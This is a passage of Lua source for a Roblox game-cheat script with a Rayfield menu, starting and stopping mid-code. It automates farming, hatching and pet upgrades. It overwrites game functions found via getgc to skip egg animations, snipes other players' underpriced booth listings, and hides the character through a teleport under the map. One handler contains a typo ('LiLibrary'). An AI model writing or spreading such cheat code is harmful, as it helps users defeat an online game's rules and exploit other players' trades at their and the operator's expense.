                    Platform.Name = ""PrivatePlatform""
                    Platform.Anchored = true
                    Platform.Size = Vector3.new(40,2,40)
                end
                GetHumanoidRootPart().CFrame = Workspace:FindFirstChild(""PrivatePlatform"").CFrame + Vector3.new(0,5,0)
            end
        end)
    end
})

MainTab:CreateToggle({
	Name = ""Automatically Complete Game"",
    CurrentValue = Config.Farming.StartCompleteGame,
    Flag = ""ToggleStartCompleteGame"",
	Callback = function(Value)
        Config.Farming.StartCompleteGame = Value
        if Config.Farming.StartCompleteGame then
            CompleteGame()
        end
    end
})

local AreasSection = MainTab:CreateSection(""Areas"")

local SelectedAreasLabel = MainTab:CreateParagraph({Title = ""Selected Areas"", Content = table.concat(Config.Farming.Areas, "", "")})

for i,v in pairs(AreaList) do
    MainTab:CreateDropdown({
        Name = i,
        CurrentOption = """",
        Options = v,
        Callback = function(Value)
            if not table.find(Config.Farming.Areas, Value) then
                table.insert(Config.Farming.Areas, Value)
            elseif table.find(Config.Farming.Areas, Value) then
                for i,v in pairs(Config.Farming.Areas) do
                    if v == Value then
                        table.remove(Config.Farming.Areas, i)
                    end
                end
            end

            SelectedAreasLabel:Set({Title = ""Selected Areas"", Content = table.concat(Config.Farming.Areas, "", "")})
        end
    })
end

local BlacklistedSection = MainTab:CreateSection(""Blacklisted"")

local BlacklistedAreaLabel = MainTab:CreateParagraph({Title = ""Selected Coins"", Content = table.concat(Config.Farming.Blacklisted, "", "")})

for i,v in pairs(CoinTypeList) do
    MainTab:CreateDropdown({
        Name = i,
        CurrentOption = """",
        Options = v,
        Callback = function(Value)
            if not table.find(Config.Farming.Blacklisted, Value) then
                table.insert(Config.Farming.Blacklisted, Value)
            elseif table.find(Config.Farming.Blacklisted, Value) then
                for i,v in pairs(Config.Farming.Blacklisted) do
                    if v == Value then
                        table.remove(Config.Farming.Blacklisted, i)
                    end
                end
            end

            BlacklistedAreaLabel:Set({Title = ""Selected Areas"", Content = table.concat(Config.Farming.Blacklisted, "", "")})
        end
    })
end

local PetsTab = Window:CreateTab(""Pets (🥚)"")

local EggsSection = PetsTab:CreateSection(""Eggs"")

local EggStats = PetsTab:CreateParagraph({Title = ""Statistics"", Content = ""Eggs Hatched: ""..EggsHatched..""\nEggs Remaining: ""..EggsRemaining})

PetsTab:CreateToggle({
	Name = ""Start Hatch"",
    CurrentValue = Config.Pets.StartHatch,
    Flag = ""ToggleStartHatch"",
	Callback = function(Value)
        Config.Pets.StartHatch = Value
        task.spawn(function()
            while Config.Pets.StartHatch and task.wait(0.1) do
                BuyEgg()
                EggStats:Set({Title = ""Statistics"", Content = ""Eggs Hatched: ""..EggsHatched..""\nEggs Remaining: ""..EggsRemaining})
            end
        end)
    end
})

PetsTab:CreateToggle({
	Name = ""Start Open Inventory"",
    CurrentValue = Config.Pets.StartOpenInventory,
    Flag = ""ToggleStartOpenInventory"",
	Callback = function(Value)
        Config.Pets.StartOpenInventory = Value
        task.spawn(function()
            while Config.Pets.StartOpenInventory and task.wait(20) do
                if not Config.Pets.StartOpenInventory then break end
                Players.LocalPlayer.PlayerGui.Inventory.Enabled = true
                wait(1)
                Players.LocalPlayer.PlayerGui.Inventory.Enabled = false
            end
        end)
    end
})

local EggFunction
for i,v in pairs(getgc(true)) do
    if type(v) == ""table"" and rawget(v, ""OpenEgg"") then
        EggFunction = v.OpenEgg
    end
end
PetsTab:CreateToggle({
	Name = ""Skip Egg Animation"",
    CurrentValue = Config.Pets.DisableEggAnimation,
    Flag = ""ToggleDisableEggAnimation"",
	Callback = function(Value)
        Config.Pets.DisableEggAnimation = Value
        if Config.Pets.DisableEggAnimation then
            for i,v in pairs(getgc(true)) do
                if type(v) == ""table"" and rawget(v, ""OpenEgg"") then
                    EggFunction = v.OpenEgg
                    v.OpenEgg = function()
                        return true
                    end
                end
            end
        else
            for i,v in pairs(getgc(true)) do
                if type(v) == ""table"" and rawget(v, ""OpenEgg"") then
                    v.OpenEgg = EggFunction
                    EggFunction = nil
                end
            end
        end
    end
})

PetsTab:CreateToggle({
	Name = ""Disable Notifications"",
    CurrentValue = Config.Pets.DisableNotifications,
    Flag = ""ToggleDisableNotifications"",
	Callback = function(Value)
        Config.Pets.DisableNotifications = Value
        task.spawn(function()
            if Config.Pets.DisableNotifications then
                Player.PlayerGui.Notifications.Enabled = false
            else
                Player.PlayerGui.Notifications.Enabled = true
            end
        end)
    end
})

PetsTab:CreateToggle({
	Name = ""Teleport To Egg"",
    CurrentValue = Config.Pets.TeleportToEgg,
    Flag = ""ToggleTeleportToEgg"",
	Callback = function(Value)
        Config.Pets.TeleportToEgg = Value
    end
})


PetsTab:CreateDropdown({
	Name = ""Choose Mode"",
	CurrentOption = Config.Pets.Mode,
	Options = {""Single"", ""Triple"", ""Octuple""},
    Flag = ""EggModeOption"",
	Callback = function(Value)
		Config.Pets.Mode = Value
	end
})

PetsTab:CreateDropdown({
	Name = ""Choose Egg"",
	CurrentOption = Config.Pets.ChoosenEgg,
	Options = EggList,
    Flag = ""ChoosenEggOption"",
	Callback = function(Value)
		Config.Pets.ChoosenEgg = Value
	end
})

local MachinesTab = Window:CreateTab(""Machines (🏭)"")

local GoldenSection = MachinesTab:CreateSection(""Golden"")

MachinesTab:CreateToggle({
	Name = ""Start Golden"",
    CurrentValue = Config.Machines.Golden.StartGolden,
    Flag = ""ToggleStartGolden"",
	Callback = function(Value)
        Config.Machines.Golden.StartGolden = Value
        task.spawn(function()
            while Config.Machines.Golden.StartGolden and task.wait() do
                MakePetsGolden()
            end
        end)
    end
})

MachinesTab:CreateSlider({
	Name = ""Amount"",
    Range = {1,6},
	CurrentValue = Config.Machines.Golden.GoldenAmount,
	Increment = 1,
	Suffix = ""Pets"",
    Flag = ""GoldenAmountValue"",
	Callback = function(Value)
		Config.Machines.Golden.GoldenAmount = Value
	end 
})

MachinesTab:CreateToggle({
	Name = ""Use Hardcore Pets"",
    CurrentValue = Config.Machines.Golden.GoldenHC,
    Flag = ""ToggleGoldenHC"",
	Callback = function(Value)
        Config.Machines.Golden.GoldenHC = Value
    end
})

MachinesTab:CreateSlider({
	Name = ""Hardcore Amount"",
    Range = {1,10},
	CurrentValue = Config.Machines.Golden.GoldenHCAmount,
	Increment = 1,
	Suffix = ""Pets"",
    Flag = ""GoldenHCAmountValue"",
	Callback = function(Value)
		Config.Machines.Golden.GoldenHCAmount = Value
	end
})

MachinesTab:CreateToggle({
	Name = ""Use Shiny Pets"",
    CurrentValue = Config.Machines.Golden.GoldenShiny,
    Flag = ""ToggleGoldenShiny"",
	Callback = function(Value)
        Config.Machines.Golden.GoldenShiny = Value
    end
})

local RainbowSection = MachinesTab:CreateSection(""Rainbow"")

MachinesTab:CreateToggle({
	Name = ""Start Rainbow"",
    CurrentValue = Config.Machines.Rainbow.StartRainbow,
    Flag = ""ToggleStartRainbow"",
	Callback = function(Value)
        Config.Machines.Rainbow.StartRainbow = Value
        task.spawn(function()
            while Config.Machines.Rainbow.StartRainbow and task.wait() do
                MakePetsRainbow()
            end
        end)
    end
})

MachinesTab:CreateSlider({
	Name = ""Amount"",
    Range = {1,6},
	CurrentValue = Config.Machines.Rainbow.RainbowAmount,
	Increment = 1,
	Suffix = ""Pets"",
    Flag = ""RainbowAmountValue"",
	Callback = function(Value)
		Config.Machines.Rainbow.RainbowAmount = Value
	end 
})

MachinesTab:CreateToggle({
	Name = ""Use Hardcore Pets"",
    CurrentValue = Config.Machines.Rainbow.RainbowHC,
    Flag = ""ToggleRainbowHC"",
	Callback = function(Value)
        Config.Machines.Rainbow.RainbowHC = Value
    end
})

MachinesTab:CreateSlider({
	Name = ""Hardcore Amount"",
    Range = {1,10},
	CurrentValue = Config.Machines.Rainbow.RainbowHCAmount,
	Increment = 1,
	Suffix = ""Pets"",
    Flag = ""RainbowHCAmountValue"",
	Callback = function(Value)
		Config.Machines.Rainbow.RainbowHCAmount = Value
	end
})

MachinesTab:CreateToggle({
	Name = ""Use Shiny Pets"",
    CurrentValue = Config.Machines.Rainbow.RainbowShiny,
    Flag = ""ToggleRainbowShiny"",
	Callback = function(Value)
        Config.Machines.Rainbow.RainbowShiny = Value
    end
})

local DarkMatterSection = MachinesTab:CreateSection(""Dark Matter"")

MachinesTab:CreateToggle({
	Name = ""Start Dark Matter"",
    CurrentValue = Config.Machines.DarkMatter.StartDarkMatter,
    Flag = ""StartDarkMatter"",
	Callback = function(Value)
        Config.Machines.DarkMatter.StartDarkMatter = Value
        task.spawn(function()
            while Config.Machines.DarkMatter.StartDarkMatter and task.wait() do
                MakePetsDarkMatter()
            end
        end)
    end
})

MachinesTab:CreateToggle({
	Name = ""Start Claim Pets"",
    CurrentValue = Config.Machines.DarkMatter.ClaimPets,
    Flag = ""ToggleClaimPets"",
	Callback = function(Value)
        Config.Machines.DarkMatter.ClaimPets = Value
        task.spawn(function()
            while Config.Machines.DarkMatter.ClaimPets and task.wait() do
                ClaimDarkMatterPets()
            end
        end)
    end
})

MachinesTab:CreateSlider({
	Name = ""Amount"",
    Range = {1,6},
	CurrentValue = Config.Machines.DarkMatter.DarkMatterAmount,
	Increment = 1,
	Suffix = ""Pets"",
    Flag = ""DarkMatterAmountValue"",
	Callback = function(Value)
		Config.Machines.DarkMatter.DarkMatterAmount = Value
	end
})

MachinesTab:CreateToggle({
	Name = ""Hardcore Pets"",
    CurrentValue = Config.Machines.DarkMatter.DarkMatterHC,
    Flag = ""ToggleDarkMatterHC"",
	Callback = function(Value)
        Config.Machines.DarkMatter.DarkMatterHC = Value
    end
})

MachinesTab:CreateSlider({
	Name = ""Hardcore Amount"",
    Range = {1,8},
	CurrentValue = Config.Machines.DarkMatter.DarkMatterHCAmount,
	Increment = 1,
	Suffix = ""Pets"",
    Flag = ""DarkMatterHCAmountValue"",
	Callback = function(Value)
		Config.Machines.DarkMatter.DarkMatterHCAmount = Value
	end
})

MachinesTab:CreateToggle({
	Name = ""Use Shiny Pets"",
    CurrentValue = Config.Machines.DarkMatter.DarkMatterShiny,
    Flag = ""ToggleDarkMatterShiny"",
	Callback = function(Value)
        Config.Machines.DarkMatter.DarkMatterShiny = Value
    end
})

local FusingSection = MachinesTab:CreateSection(""Fusing"")

MachinesTab:CreateToggle({
	Name = ""Start Fuse"",
    CurrentValue = Config.Machines.Fusing.StartFuse,
    Flag = ""ToggleStartFuse"",
	Callback = function(Value)
        Config.Machines.Fusing.StartFuse = Value
        task.spawn(function()
            while Config.Machines.Fusing.StartFuse and task.wait() do
                FusePets()
            end
        end)
    end
})

MachinesTab:CreateDropdown({
	Name = ""Choose Mode"",
	CurrentOption = Config.Machines.Fusing.Mode,
	Options = {""Normal"", ""Lowest Strength""},
    Flag = ""FusingModeOption"",
	Callback = function(Value)
		Config.Machines.Fusing.Mode = Value
	end
})

MachinesTab:CreateSlider({
	Name = ""Fuse Amount"",
    Range = {3,12},
	CurrentValue = Config.Machines.Fusing.Amount,
	Increment = 1,
	Suffix = ""Pets"",
    Flag = ""FuseAmountValue"",
	Callback = function(Value)
		Config.Machines.Fusing.Amount = Value
	end
})

MachinesTab:CreateInput({
	Name = ""Stop When Pets Are Lower Then X"",
	PlaceholderText  = Config.Machines.Fusing.WhenToStop,
	RemoveTextAfterFocusLost  = false,
    Flag = ""StopPetsWhenLowerTextBox"",
	Callback = function(Value)
		Config.Machines.Fusing.WhenToStop = Value
	end
})

local BoothsTab = Window:CreateTab(""Booths (💎)"")

local SellingSection = BoothsTab:CreateSection(""Selling"")

local SellingList = BoothsTab:CreateParagraph({Title = ""Selling List"", Content = ""\n\n\n\n\n\n\n""})

local SellSaveNumber = tonumber((Config.Booths.Selling.EditMode and Config.Booths.Selling.EditNumber) or #Config.Booths.Selling.SellingList + 1)

if #Config.Booths.Selling.SellingList >= 1 then
    local TempSellingListTable = {}
    for i,v in pairs(Config.Booths.Selling.SellingList) do
        table.insert(TempSellingListTable, ""[""..i..""] ""..""[Pet] ""..Library.Directory.Pets[v.Pet].name.."", [Price] ""..Library.Functions.Commas(tonumber(v.Price)).."", [Type] ""..table.concat(v.Type, "", ""))
    end
    SellingList:Set({Title = ""Selling List"", Content = table.concat(TempSellingListTable, ""\n"")})
end

BoothsTab:CreateToggle({
	Name = ""Start Selling Pets"",
    CurrentValue = Config.Booths.Selling.StartSellingPet,
    Flag = ""ToggleStartSell"",
	Callback = function(Value)
        Config.Booths.Selling.StartSellingPet = Value
        task.spawn(function()
            while Config.Booths.Selling.StartSellingPet and task.wait() do
                if #Config.Booths.Selling.SellingList >= 1 then
                    SellPets()
                else
                    RayField.Flags[""ToggleStartSell""]:Set(false)
                    break
                end
            end
        end)
    end
})

BoothsTab:CreateInput({
	Name = ""Choosen Pet To Sell"",
	PlaceholderText = Config.Booths.Selling.ChoosenPetToSell,
	RemoveTextAfterFocusLost = false,
	Callback = function(Value)
        if tonumber(Value) then
            Value = Value
        else
            for i,v in pairs(Library.Directory.Pets) do
                if v.name == Value then
                    Value = i
                end
            end
        end
        Config.Booths.Selling.ChoosenPetToSell = Value
	end
})

BoothsTab:CreateInput({
	Name = ""Choosen Pet Price"",
	PlaceholderText = Config.Booths.Selling.ChoosenPetPrice,
	RemoveTextAfterFocusLost = false,
	Callback = function(Value)
        Config.Booths.Selling.ChoosenPetPrice = Value
	end
})

local SelectedSellingOptions = BoothsTab:CreateParagraph({Title = ""Selected Types"", Content = ""None""})
if #Config.Booths.Selling.Options >= 1 then
    SelectedSellingOptions:Set({Title = ""Selected Types"", Content = table.concat(Config.Booths.Selling.Options[SellSaveNumber], "", "")})
end

BoothsTab:CreateDropdown({
	Name = ""Choose Types"",
	CurrentOption = """",
	Options = TypeList,
	Callback = function(Value)
        if not Config.Booths.Selling.Options[SellSaveNumber] then
            Config.Booths.Selling.Options[SellSaveNumber] = {}
        end
        if not table.find(Config.Booths.Selling.Options[SellSaveNumber], Value) then
            table.insert(Config.Booths.Selling.Options[SellSaveNumber], Value)
        elseif table.find(Config.Booths.Selling.Options[SellSaveNumber], Value) then
            for i,v in pairs(Config.Booths.Selling.Options[SellSaveNumber]) do
                if v == Value then
                    table.remove(Config.Booths.Selling.Options[SellSaveNumber], i)
                end
            end
        end
        SelectedSellingOptions:Set({Title = ""Selected Types"", Content = table.concat(Config.Booths.Selling.Options[SellSaveNumber], "", "")})
	end
})

local SellingListOptionsSection = BoothsTab:CreateSection(""Selling List Options"")

BoothsTab:CreateButton({
	Name = ""Save To Selling List"",
	Callback = function()
        if not tonumber(Config.Booths.Selling.ChoosenPetToSell) or not tonumber(Config.Booths.Selling.ChoosenPetPrice) or #Config.Booths.Selling.Options[SellSaveNumber] < 1 then
            return
        end
        if not Config.Booths.Selling.SellingList[SellSaveNumber] then
            Config.Booths.Selling.SellingList[SellSaveNumber] = {[""Pet""] = Config.Booths.Selling.ChoosenPetToSell, [""Price""] = Config.Booths.Selling.ChoosenPetPrice, [""Type""] = Config.Booths.Selling.Options[SellSaveNumber]}
        end
        local SellingListTable = {}
        for i,v in pairs(Config.Booths.Selling.SellingList) do
            table.insert(SellingListTable, ""[""..i..""] ""..""[Pet] ""..Library.Directory.Pets[v.Pet].name.."", [Price] ""..Library.Functions.Commas(tonumber(v.Price)).."", [Type] ""..table.concat(v.Type, "", ""))
        end
        SellingList:Set({Title = ""Selling List"", Content = table.concat(SellingListTable, ""\n"")})
        SellSaveNumber = tonumber((Config.Booths.Selling.EditMode and Config.Booths.Selling.EditNumber) or #Config.Booths.Selling.SellingList + 1)
        SelectedSellingOptions:Set({Title = ""Selected Types"", Content = ""Select Types""})
        if not Config.Booths.Selling.Options[SellSaveNumber] then
            Config.Booths.Selling.Options[SellSaveNumber] = {}
        end
  	end
})

BoothsTab:CreateToggle({
	Name = ""Edit Mode"",
    CurrentValue = Config.Booths.Selling.EditMode,
	Callback = function(Value)
        Config.Booths.Selling.EditMode = Value
        if Config.Booths.Selling.EditMode then
            SelectedSellingOptions:Set({Title = ""Selected Types"", Content = table.concat(Config.Booths.Selling.Options[SellSaveNumber], "", "")})
        end
        task.spawn(function()
            while Config.Booths.Selling.EditMode and task.wait() do
                pcall(function()
                    SellSaveNumber = tonumber((Config.Booths.Selling.EditMode and Config.Booths.Selling.EditNumber) or #Config.Booths.Selling.SellingList + 1)
                    local SellListToEdit = Config.Booths.Selling.SellingList[SellSaveNumber]
                    SellListToEdit.Pet = Config.Booths.Selling.ChoosenPetToSell
                    SellListToEdit.Price = Config.Booths.Selling.ChoosenPetPrice
                    SellListToEdit.Type = Config.Booths.Selling.Options[SellSaveNumber]
                    local SellingListTable = {}
                    for i,v in pairs(Config.Booths.Selling.SellingList) do
                        table.insert(SellingListTable, ""[""..i..""] ""..""[Pet] ""..Library.Directory.Pets[v.Pet].name.."", [Price] ""..Library.Functions.Commas(tonumber(v.Price)).."", [Type] ""..table.concat(v.Type, "", ""))
                    end
                    SellingList:Set({Title = ""Selling List"", Content = table.concat(SellingListTable, ""\n"")})
                end)
            end
        end)
    end
})

BoothsTab:CreateButton({
	Name = ""Remove From Sell List"",
	Callback = function()
        local ListToReAdd = {}
        for i,v in pairs(Config.Booths.Selling.SellingList) do
            task.spawn(function()
                if i ~= tonumber(Config.Booths.Selling.EditNumber) then
                    table.insert(ListToReAdd, v) 
                end
            end)
        end
        Config.Booths.Selling.SellingList = ListToReAdd
        local SellingListTable = {}
        for i,v in pairs(Config.Booths.Selling.SellingList) do
            table.insert(SellingListTable, ""[""..i..""] ""..""[Pet] ""..Library.Directory.Pets[v.Pet].name.."", [Price] ""..Library.Functions.Commas(tonumber(v.Price)).."", [Type] ""..table.concat(v.Type, "", ""))
        end
        SellingList:Set({Title = ""Selling List"", Content = table.concat(SellingListTable, ""\n"")})
  	end
})

BoothsTab:CreateInput({
	Name = ""Number To Edit Or Delete"",
	PlaceholderText = Config.Booths.Selling.EditNumber,
	RemoveTextAfterFocusLost = false,
	Callback = function(Value)
        Config.Booths.Selling.EditNumber = Value
	end
})

if Premium then
local SnipingSection = BoothsTab:CreateSection(""Sniping"")

local SnipingList = BoothsTab:CreateParagraph({Title = ""Sniping List"", Content = ""\n\n\n\n\n\n\n""})

local SnipeSaveNumber = tonumber((Config.Booths.Sniping.EditMode and Config.Booths.Sniping.EditNumber) or #Config.Booths.Sniping.SnipingList + 1)
if #Config.Booths.Sniping.SnipingList >= 1 then
    local TempSnipingList = {}
    for i,v in pairs(Config.Booths.Sniping.SnipingList) do
        table.insert(TempSnipingList, ""[""..i..""] ""..""[Pet] ""..((tonumber(v.Pet) and Library.Directory.Pets[v.Pet].name) or ""None"").."", [Snipe Under] ""..tostring(v.SnipeUnder).."", [Gems Under] ""..((tonumber(v.GemsUnder) and Library.Functions.Commas(tonumber(v.GemsUnder))) or ""None"").."", [Type] ""..table.concat(v.Type, "", "").."", [Snipe Rarity] ""..tostring(v.SnipeRarity).."", [Rarity] ""..((type(v.Rarity) == ""table"" and table.concat(v.Rarity, "", "")) or v.Rarity))
    end
    SnipingList:Set({Title = ""Sniping List"", Content = table.concat(TempSnipingList, ""\n"")})
end

BoothsTab:CreateToggle({
	Name = ""Start Sniping Pet"",
    CurrentValue = Config.Booths.Sniping.StartSnipingPet,
    Flag = ""ToggleSnipePet"",
	Callback = function(Value)
        Config.Booths.Sniping.StartSnipingPet = Value
        Buying = false
        task.spawn(function()
            while Config.Booths.Sniping.StartSnipingPet and task.wait() do
                if #Config.Booths.Sniping.SnipingList >= 1 then
                    SnipePets()
                else
                    RayField.Flags[""ToggleSnipePet""]:Set(false)
                    break
                end
            end
        end)
    end
})

BoothsTab:CreateToggle({
	Name = ""Snipe By Rarity"",
    CurrentValue = Config.Booths.Sniping.SnipePetRarity,
    Flag = ""ToggleSnipePetRarity"",
	Callback = function(Value)
        Config.Booths.Sniping.SnipePetRarity = Value
    end
})


BoothsTab:CreateToggle({
	Name = ""Snipe Pet Under Gems"",
    CurrentValue = Config.Booths.Sniping.SnipePetUnder,
    Flag = ""ToggleSnipePetUnder"",
	Callback = function(Value)
        Config.Booths.Sniping.SnipePetUnder = Value
    end
})

BoothsTab:CreateInput({
	Name = ""Gems Under To Snipe"",
	PlaceholderText = Config.Booths.Sniping.GemsUnderToSnipe,
	RemoveTextAfterFocusLost = false,
	Callback = function(Value)
        Config.Booths.Sniping.GemsUnderToSnipe = Value
	end
})

BoothsTab:CreateInput({
	Name = ""Choosen Pet To Snipe"",
	PlaceholderText = Config.Booths.Sniping.ChoosenPetToSnipe,
	RemoveTextAfterFocusLost = false,
	Callback = function(Value)
        if tonumber(Value) then
            Value = Value
        else
            for i,v in pairs(Library.Directory.Pets) do
                if v.name == Value then
                    Value = i
                end
            end
        end
        Config.Booths.Sniping.ChoosenPetToSnipe = Value
	end
})

local SelectedSnipingOptions = BoothsTab:CreateParagraph({Title = ""Selected Types"", Content = ""None""})
if #Config.Booths.Sniping.Options >= 1 then
    SelectedSnipingOptions:Set({Title = ""Selected Types"", Content = table.concat(Config.Booths.Sniping.Options[SnipeSaveNumber], "", "")})
else
    SelectedSnipingOptions:Set({Title = ""Selected Types"", Content = ""None""})
end

BoothsTab:CreateDropdown({
	Name = ""Choose Types"",
	CurrentOption = """",
	Options = TypeList,
	Callback = function(Value)
        if not Config.Booths.Sniping.Options[SnipeSaveNumber] then
            Config.Booths.Sniping.Options[SnipeSaveNumber] = {}
        end
        if not table.find(Config.Booths.Sniping.Options[SnipeSaveNumber], Value) then
            table.insert(Config.Booths.Sniping.Options[SnipeSaveNumber], Value)
        elseif table.find(Config.Booths.Sniping.Options[SnipeSaveNumber], Value) then
            for i,v in pairs(Config.Booths.Sniping.Options[SnipeSaveNumber]) do
                if v == Value then
                    table.remove(Config.Booths.Sniping.Options[SnipeSaveNumber], i)
                end
            end
        end
        SelectedSnipingOptions:Set({Title = ""Selected Types"", Content = table.concat(Config.Booths.Sniping.Options[SnipeSaveNumber], "", "")})
	end
})

local SelectedSnipingRarities = BoothsTab:CreateParagraph({Title = ""Selected Rarities"", Content = ""None""})
if #Config.Booths.Sniping.Rarities >= 1 then
    SelectedSnipingRarities:Set({Title = ""Selected Rarities"", Content = table.concat(Config.Booths.Sniping.Rarities[SnipeSaveNumber], "", "")})
else
    SelectedSnipingRarities:Set({Title = ""Selected Rarities"", Content = ""None""})
end

BoothsTab:CreateDropdown({
	Name = ""Choose Rarities"",
	CurrentOption = """",
	Options = {""Basic"", ""Rare"", ""Epic"", ""Legendary"", ""Mythical"", """", ""Event"", ""Exclusive"", ""Huge"", ""Titanic""},
	Callback = function(Value)
        if not Config.Booths.Sniping.Rarities[SnipeSaveNumber] then
            Config.Booths.Sniping.Rarities[SnipeSaveNumber] = {}
        end
        if not table.find(Config.Booths.Sniping.Rarities[SnipeSaveNumber], Value) then
            table.insert(Config.Booths.Sniping.Rarities[SnipeSaveNumber], Value)
        elseif table.find(Config.Booths.Sniping.Rarities[SnipeSaveNumber], Value) then
            for i,v in pairs(Config.Booths.Sniping.Rarities[SnipeSaveNumber]) do
                if v == Value then
                    table.remove(Config.Booths.Sniping.Rarities[SnipeSaveNumber], i)
                end
            end
        end
        SelectedSnipingRarities:Set({Title = ""Selected Rarities"", Content = table.concat(Config.Booths.Sniping.Rarities[SnipeSaveNumber], "", "")})
	end
})

local SnipingListOptions = BoothsTab:CreateSection(""Sniping List Options"")

BoothsTab:CreateButton({
	Name = ""Save To Sniping List"",
	Callback = function()
        if #Config.Booths.Sniping.Options[SnipeSaveNumber] < 1 then
            return
        end
        if not Config.Booths.Sniping.SnipingList[SnipeSaveNumber] then
            Config.Booths.Sniping.SnipingList[SnipeSaveNumber] = {[""Pet""] = Config.Booths.Sniping.ChoosenPetToSnipe, [""SnipeUnder""] = Config.Booths.Sniping.SnipePetUnder, [""GemsUnder""] = Config.Booths.Sniping.GemsUnderToSnipe, [""Type""] = Config.Booths.Sniping.Options[SnipeSaveNumber], [""SnipeRarity""] = Config.Booths.Sniping.SnipePetRarity, [""Rarity""] = (tonumber(Config.Booths.Sniping.ChoosenPetToSnipe) and ""None"") or Config.Booths.Sniping.Rarities[SnipeSaveNumber]}
        end
        local SnipingListTable = {}
        for i,v in pairs(Config.Booths.Sniping.SnipingList) do
            table.insert(SnipingListTable, ""[""..i..""] ""..""[Pet] ""..((tonumber(v.Pet) and Library.Directory.Pets[v.Pet].name) or ""None"").."", [Snipe Under] ""..tostring(v.SnipeUnder).."", [Gems Under] ""..((tonumber(v.GemsUnder) and Library.Functions.Commas(tonumber(v.GemsUnder))) or ""None"").."", [Type] ""..table.concat(v.Type, "", "").."", [Snipe Rarity] ""..tostring(v.SnipeRarity).."", [Rarity] ""..((type(v.Rarity) == ""table"" and table.concat(v.Rarity, "", "")) or v.Rarity))
        end
        SnipingList:Set({Title = ""Sniping List"", Content = table.concat(SnipingListTable, ""\n"")})

        SnipeSaveNumber = tonumber((Config.Booths.Sniping.EditMode and Config.Booths.Sniping.EditNumber) or #Config.Booths.Sniping.SnipingList + 1)
        SelectedSnipingOptions:Set({Title = ""Selected Types"", Content = ""None""})
        SelectedSnipingRarities:Set({Title = ""Selected Rarities"", Content = ""None""})
        if not Config.Booths.Sniping.Options[SnipeSaveNumber] then
            Config.Booths.Sniping.Options[SnipeSaveNumber] = {}
        end
        if not Config.Booths.Sniping.Rarities[SnipeSaveNumber] then
            Config.Booths.Sniping.Rarities[SnipeSaveNumber] = {}
        end
  	end
})

BoothsTab:CreateToggle({
	Name = ""Edit Mode"",
    CurrentValue = Config.Booths.Sniping.EditMode,
	Callback = function(Value)
        Config.Booths.Sniping.EditMode = Value
        if Config.Booths.Sniping.EditMode then
            SnipeSaveNumber = tonumber((Config.Booths.Sniping.EditMode and Config.Booths.Sniping.EditNumber) or #Config.Booths.Sniping.SnipingList + 1)
            SelectedSellingOptions:Set({Title = ""Selected Types"", Content = table.concat(Config.Booths.Sniping.Options[SnipeSaveNumber], "", "")})
            SelectedSnipingRarities:Set({Title = ""Selected Rarities"", Content = table.concat(Config.Booths.Sniping.Rarities[SnipeSaveNumber], "", "")})
        end
        task.spawn(function()
            while Config.Booths.Sniping.EditMode and task.wait() do
                pcall(function()
                    SnipeSaveNumber = tonumber((Config.Booths.Sniping.EditMode and Config.Booths.Sniping.EditNumber) or #Config.Booths.Sniping.SnipingList + 1)
                    local SnipeListToEdit = Config.Booths.Sniping.SnipingList[SnipeSaveNumber]
                    SnipeListToEdit.Pet = Config.Booths.Sniping.ChoosenPetToSnipe
                    SnipeListToEdit.SnipeUnder = Config.Booths.Sniping.SnipePetUnder
                    SnipeListToEdit.GemsUnder = Config.Booths.Sniping.GemsUnderToSnipe
                    SnipeListToEdit.Type = Config.Booths.Sniping.Options[SnipeSaveNumber]
                    SnipeListToEdit.SnipeRarity = Config.Booths.Sniping.SnipePetRarity
                    SnipeListToEdit.Rarity = (tonumber(Config.Booths.Sniping.ChoosenPetToSnipe) and ""None"") or Config.Booths.Sniping.Rarities[SnipeSaveNumber]
                    local SnipingListTable = {}
                    for i,v in pairs(Config.Booths.Sniping.SnipingList) do
                        table.insert(SnipingListTable, ""[""..i..""] ""..""[Pet] ""..((tonumber(v.Pet) and Library.Directory.Pets[v.Pet].name) or ""None"").."", [Snipe Under] ""..tostring(v.SnipeUnder).."", [Gems Under] ""..((tonumber(v.GemsUnder) and Library.Functions.Commas(tonumber(v.GemsUnder))) or ""None"").."", [Type] ""..table.concat(v.Type, "", "").."", [Snipe Rarity] ""..tostring(v.SnipeRarity).."", [Rarity] ""..((type(v.Rarity) == ""table"" and table.concat(v.Rarity, "", "")) or v.Rarity))
                    end
                    SnipingList:Set({Title = ""Sniping List"", Content = table.concat(SnipingListTable, ""\n"")})
        
                end)
            end
        end)
    end
})

BoothsTab:CreateButton({
	Name = ""Remove From Snipe List"",
	Callback = function()
        local ListToReAdd = {}
        for i,v in pairs(Config.Booths.Sniping.SnipingList) do
            task.spawn(function()
                if i ~= tonumber(Config.Booths.Sniping.EditNumber) then
                    table.insert(ListToReAdd, v) 
                end
            end)
        end
        Config.Booths.Sniping.SnipingList = ListToReAdd
        local SnipingListTable = {}
        for i,v in pairs(Config.Booths.Sniping.SnipingList) do
            table.insert(SnipingListTable, ""[""..i..""] ""..""[Pet] ""..((tonumber(v.Pet) and Library.Directory.Pets[v.Pet].name) or ""None"").."", [Snipe Under] ""..tostring(v.SnipeUnder).."", [Gems Under] ""..((tonumber(v.GemsUnder) and LiLibrary.Functions.Commas(tonumber(v.GemsUnder))) or ""None"").."", [Type] ""..table.concat(v.Type, "", "").."", [Snipe Rarity] ""..tostring(v.SnipeRarity).."", [Rarity] ""..((type(v.Rarity) == ""table"" and table.concat(v.Rarity, "", "")) or v.Rarity))
        end
        SnipingList:Set({Title = ""Sniping List"", Content = table.concat(SnipingListTable, ""\n"")})
  	end
})

BoothsTab:CreateInput({
	Name = ""Number To Edit Or Delete"",
	PlaceholderText = Config.Booths.Sniping.EditNumber,
	RemoveTextAfterFocusLost = false,
	Callback = function(Value)
        Config.Booths.Sniping.EditNumber = Value
	end
})
end

local ExtraSection = BoothsTab:CreateSection(""Extra"")

BoothsTab:CreateToggle({
	Name = ""Teleport To Booth [Experimental]"",
    CurrentValue = Config.Booths.Extra.TeleportToBooth,
    Flag = ""ToggleTeleportToBooth"",
	Callback = function(Value)
        Config.Booths.Extra.TeleportToBooth = Value
    end
})

BoothsTab:CreateToggle({
	Name = ""Go Invisible"",
    CurrentValue = Config.Booths.Extra.GoInvisible,
    Flag = ""ToggleGoInvisible"",
	Callback = function(Value)
        Config.Booths.Extra.GoInvisible = Value
        if Config.Booths.Extra.GoInvisible then
            local SavedPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -200, 0)
            wait(.15)
            local Seat = Instance.new('Seat', game.Workspace)
